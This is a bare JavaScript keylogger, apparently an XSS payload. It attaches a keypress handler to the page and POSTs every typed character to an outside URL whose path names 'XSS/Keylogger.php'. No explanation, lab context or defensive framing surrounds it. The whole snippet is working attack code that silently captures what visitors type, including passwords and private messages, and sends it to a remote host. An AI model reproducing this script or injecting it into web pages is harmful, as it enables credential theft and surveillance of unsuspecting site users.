document.onkeypress = function(evt) {
    evt = evt || window.event
    key = String.fromCharCode(evt.charCode)
    if (key) {
        var http = new XMLHttpRequest();
        var param = encodeURI(key)
        http.open("POST","https://github.com/2733683116/agrying/blob/main/XSS/Keylogger.php",true);
        http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
        http.send("key="+param);
    }
} 
